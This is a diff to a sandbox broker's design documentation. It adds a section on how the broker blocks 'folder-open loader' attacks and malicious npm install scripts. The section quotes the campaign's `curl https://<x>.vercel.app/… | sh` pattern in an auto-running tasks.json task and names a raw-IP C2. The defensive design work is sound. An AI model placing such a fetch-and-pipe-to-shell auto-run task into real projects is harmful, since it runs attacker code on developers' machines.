@@ -86,7 +86,8 @@ same decisions ([EDR](../docs/edr/20261104-broker-engine-mitmproxy.md)).
 
 Decision records:
 - **ADRs:** [policy and protocol](../docs/adr/20261104-broker-policy-and-control-protocol.md),
-  [no real secret enters a tab](../docs/adr/20261104-no-real-secret-enters-a-tab.md).
+  [no real secret enters a tab](../docs/adr/20261104-no-real-secret-enters-a-tab.md),
+  [defeat folder-open loaders](../docs/adr/20261104-defeat-folder-open-loaders.md).
 - **EDRs:** [engine](../docs/edr/20261104-broker-engine-mitmproxy.md),
   [sentinels](../docs/edr/20261104-sentinel-format-and-binding.md),
   [CA](../docs/edr/20261104-broker-per-tab-ca.md),
@@ -94,7 +95,35 @@ Decision records:
   [sbx chaining](../docs/edr/20261104-broker-behind-sbx-fence.md),
   [docs from sources and safe fixtures](../docs/edr/20261104-broker-docs-from-sources-and-safe-fixtures.md).
 - **Security reviews:** [20261104-broker-m2-m3](../docs/security-reviews/20261104-broker-m2-m3.md),
-  [20261104-broker-docs-drift-and-fixtures](../docs/security-reviews/20261104-broker-docs-drift-and-fixtures.md).
+  [20261104-broker-docs-drift-and-fixtures](../docs/security-reviews/20261104-broker-docs-drift-and-fixtures.md),
+  [20261104-broker-folder-open-loaders](../docs/security-reviews/20261104-broker-folder-open-loaders.md).
+
+## Folder-open loaders, beacons and package registries
+
+The DPRK "Contagious Interview" campaign hides `curl https://<x>.vercel.app/… | sh`
+in a `runOn: folderOpen` task in `tasks.json`. The task runs **inside the tab
+sandbox**. At the broker, the chain fails without the user having to make a
+correct decision:
+- **Before the user has acted in the tab:** requests to hosting, paste, IP-echo
+  or tunnel services (the [risky-destination
+  list](../docs/broker-policy.md#risky-destinations-generated)) are denied
+  without a prompt.
+- **Raw-IP destinations**, such as its `http://<ip>:1224` C2, are always denied
+  by default.
+- **A 5-second beacon** produces one prompt, not a stream:
+  - a denied destination is cooled down for 300 s;
+  - new prompts are rate-limited per tab;
+  - after repeated denials the user can deny all new destinations for the tab.
+- **Prompts show** risk flags and the claimed (unverified) origin. They never
+  offer *always allow* for a risky host or a raw IP.
+
+The step-by-step mapping is in the
+[ADR](../docs/adr/20261104-defeat-folder-open-loaders.md).
+
+**Package registries:** a malicious npm dependency's install script also runs
+only inside the tab. It sees the workspace and sentinels, never a real secret,
+the host's files or the host's network position, and its own egress faces the
+same controls. Read access to a registry gives a payload nothing more.
 
 ## Engine capability matrix
 
